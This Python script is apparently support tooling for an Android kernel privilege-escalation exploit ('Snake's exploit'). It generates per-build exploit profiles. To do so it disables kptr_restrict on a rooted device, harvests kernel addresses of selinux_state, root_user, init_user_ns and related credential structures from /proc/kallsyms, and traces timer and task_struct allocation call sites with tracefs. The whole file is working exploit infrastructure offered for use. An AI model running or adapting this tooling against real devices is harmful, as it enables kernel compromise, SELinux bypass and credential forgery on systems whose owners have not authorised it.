#!/usr/bin/env python3
"""
Generate a K66118 profile entry for a new kernel build.

OTA changes the kernel build id and with it the KASLR-independent static
addresses Snake's exploit needs. This script collects them from a device that
already has temporary root (e.g. via TimerRoot), so you don't have to grep
nine symbols by hand and guess the call-site offsets.

What it reads (all real data, no estimation):
  * /proc/kallsyms  -> _text + the six data symbols, after kptr_restrict=0
  * tracefs kmem_cache_alloc -> the *call sites* of
        posix timer allocation (bytes_req=264) and
        task_struct allocation (bytes_req=0x12c0), which move between builds
        (e.g. posix_timer_add -> do_timer_create+0xa8, copy_process +0x114 -> +0x140)

Static address = runtime address - (_text - LINK_BASE). LINK_BASE is the
arm64 kernel link address 0xffffffc080000000 used by every existing profile.

Prerequisites:
  * adb connected, device has temporary root (su -c id -> uid=0)
  * Android NDK with aarch64-linux-android31-clang on PATH (NDK env or auto)

Usage:
  NDK=~/Library/Android/sdk/ndk/28.2.13676358 python3 gen_profile.py
  python3 gen_profile.py --from-kallsyms kallsyms.txt   # skip live collection
"""
import argparse
import os
import re
import shutil
import subprocess
import sys
import tempfile

LINK_BASE = 0xFFFFFFC080000000
TIMER_REQ = 264          # struct posix_timer allocation
TASK_REQ = 4800          # sizeof(task_struct) = 0x12c0 on 6.6
SYMBOLS = ["selinux_state", "panic_on_warn", "root_user",
           "init_user_ns", "init_ucounts", "init_groups"]


def sh(cmd, root=False, check=False):
    if isinstance(cmd, str):
        cmd = ["adb", "shell"] + (["su", "-c", cmd] if root else [cmd])
    r = subprocess.run(cmd, capture_output=True, text=True)
    if check and r.returncode != 0:
        raise RuntimeError(f"cmd failed: {cmd}\n{r.stderr}")
    return r.stdout


def find_clang():
    if os.environ.get("CC"):
        return os.environ["CC"]
    ndk = os.environ.get("ANDROID_NDK_HOME") or os.environ.get("NDK")
    if not ndk:
        for root in [os.path.expanduser("~/Library/Android/sdk/ndk"), "/opt/android-sdk/ndk"]:
            if os.path.isdir(root):
                vers = sorted(os.listdir(root), reverse=True)
                if vers:
                    ndk = os.path.join(root, vers[0])
                    break
    if not ndk:
        return shutil.which("aarch64-linux-android31-clang")
    prebuilt = os.path.join(ndk, "toolchains", "llvm", "prebuilt")
    for host in os.listdir(prebuilt) if os.path.isdir(prebuilt) else []:
        cc = os.path.join(prebuilt, host, "bin", "aarch64-linux-android31-clang")
        if os.path.exists(cc):
            return cc
    return None


def compile_helpers(tmp):
    cc = find_clang()
    if not cc:
        raise RuntimeError("NDK clang not found; set NDK= or CC=")
    here = os.path.dirname(os.path.abspath(__file__))
    out = {}
    for name in ("timer_trigger", "fork_trigger"):
        src = os.path.join(here, "helpers", f"{name}.c")
        dst = os.path.join(tmp, name)
        subprocess.run([cc, "-O1", "-static", "-o", dst, src], check=True)
        out[name] = dst
    return out


def collect_kallsyms(root=True):
    sh("echo 0 > /proc/sys/kernel/kptr_restrict", root=root)
    raw = sh("cat /proc/kallsyms", root=root)
    syms = {}
    for line in raw.splitlines():
        p = line.split()
        if len(p) < 3:
            continue
        try:
            addr = int(p[0], 16)
        except ValueError:
            continue
        if addr and p[2] not in syms:
            syms[p[2]] = addr
    return syms


def collect_call_site(helper_path, symbol, remote_name, rounds=5):
    """Return (address, display) for a kmem_cache_alloc whose call_site symbol
    is `symbol` (e.g. do_timer_create / copy_process), triggered by our helper.

    Matching on the symbol name — not bytes_req — is what survives OTA renames
    (posix_timer_add -> do_timer_create) and avoids collisions with unrelated
    allocations of the same size. The runtime address is symbol base from
    /proc/kallsyms plus the +0x.. offset tracefs reports.
    """
    subprocess.run(["adb", "push", helper_path, f"/data/local/tmp/{remote_name}"],
                   capture_output=True)
    sh(f"chmod 755 /data/local/tmp/{remote_name}", root=True)
    cmd = f"""
echo 0 > /sys/kernel/tracing/tracing_on
echo > /sys/kernel/tracing/trace
echo 1 > /sys/kernel/tracing/events/kmem/kmem_cache_alloc/enable
echo 1 > /sys/kernel/tracing/tracing_on
/data/local/tmp/{remote_name} 120 >/dev/null
echo 0 > /sys/kernel/tracing/tracing_on
grep kmem_cache_alloc /sys/kernel/tracing/trace | grep "{remote_name}-" | grep "call_site={symbol}+" | head -1
"""
    out = sh(cmd.strip(), root=True).strip()
    if not out:
        # fall back: dump symbol distribution for diagnosis
        raise RuntimeError(f"no call_site for symbol {symbol}")
    m = re.search(r"call_site=(\w+)\+0x([0-9a-fA-F]+)", out)
    if m:
        return None, m.group(0).replace("call_site=", ""), out   # symbol form
    m = re.search(r"call_site=([0-9a-fA-F]+)", out)
    if m:
        return int(m.group(1), 16), None, out
    raise RuntimeError(f"no call_site for symbol {symbol}; raw:\n{out[:500]}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--from-kallsyms", help="use a saved /proc/kallsyms dump")
    ap.add_argument("--release", help="override uname -r")
    ap.add_argument("--note", help="extra comment for the generated entry")
    args = ap.parse_args()

    if args.from_kallsyms:
        raw = open(args.from_kallsyms).read()
        syms = {}
        for line in raw.splitlines():
            p = line.split()
            if len(p) >= 3:
                try:
                    a = int(p[0], 16)
                except ValueError:
                    continue
                if a and p[2] not in syms:
                    syms[p[2]] = a
    else:
        who = sh("su -c id")
        if "uid=0" not in who:
            raise RuntimeError("temporary root required: su -c id did not return uid=0")
        syms = collect_kallsyms()

    release = args.release or sh("uname -r").strip()
    missing = [s for s in ["_text"] + SYMBOLS if s not in syms]
    if missing:
        raise RuntimeError(f"symbols missing (kptr_restrict not 0?): {missing}")

    text = syms["_text"]
    slide = text - LINK_BASE

    def static(a):
        return a - slide

    print(f"// release = {release}")
    print(f"// _text(runtime) = {text:#x}, slide = {slide:#x}")
    if args.note:
        print(f"// {args.note}")

    # The six data symbols are read straight from kallsyms.
    vals = {s: static(syms[s]) for s in SYMBOLS}
    for s in SYMBOLS:
        print(f"//   {s:16} = {vals[s]:#x}")

    # timer_site and copy_low21 need a live trace; if we only have a saved
    # kallsyms dump, emit the six symbols and leave the two call sites as TODO.
    if args.from_kallsyms:
        print("// TODO: collect timer_site / copy_low21 from a live device")
        print("//   timer:  bytes_req=264  call_site (+offset inside do_timer_create)")
        print("//   task:   bytes_req=4800 call_site (+offset inside copy_process)")
        return

    with tempfile.TemporaryDirectory() as tmp:
        helpers = compile_helpers(tmp)
        t_addr, t_sym, t_line = collect_call_site(helpers["timer_trigger"], "do_timer_create", "snk_timer")
        k_addr, k_sym, k_line = collect_call_site(helpers["fork_trigger"], "copy_process", "snk_fork")

    # Resolve call sites to runtime addresses. tracefs may print either
    # "do_timer_create+0xa8" or a raw hex address depending on kptr_restrict.
    def resolve(addr, symform, fallback_symbol):
        if addr is not None:
            return addr, symform or f"{addr:#x}"
        name, off = symform.split("+")
        base = syms.get(name.strip())
        if base is None:
            raise RuntimeError(f"call-site base symbol {name!r} not in kallsyms")
        return base + int(off, 16), symform

    timer_site, t_disp = resolve(t_addr, t_sym, "do_timer_create")
    task_site, k_disp = resolve(k_addr, k_sym, "copy_process")

    timer_static = static(timer_site)
    print(f"// timer call_site = {t_disp} -> runtime {timer_site:#x}, static {timer_static:#x}")
    print(f"// task  call_site = {k_disp} -> runtime {task_site:#x}, low21 {task_site & 0x1fffff:#x}")
    print()
    print("    {")
    print(f'        "{release}",')
    print(f"        {timer_static:#x}ULL, {timer_static & 0x1fffff:#x}ULL, "
          f"{task_site & 0x1fffff:#x}ULL,")
    print(f"        {vals['selinux_state']:#x}ULL, {vals['panic_on_warn']:#x}ULL,")
    print(f"        {vals['root_user']:#x}ULL, {vals['init_user_ns']:#x}ULL,")
    print(f"        {vals['init_ucounts']:#x}ULL, {vals['init_groups']:#x}ULL,")
    print("    },")


if __name__ == "__main__":
    main()
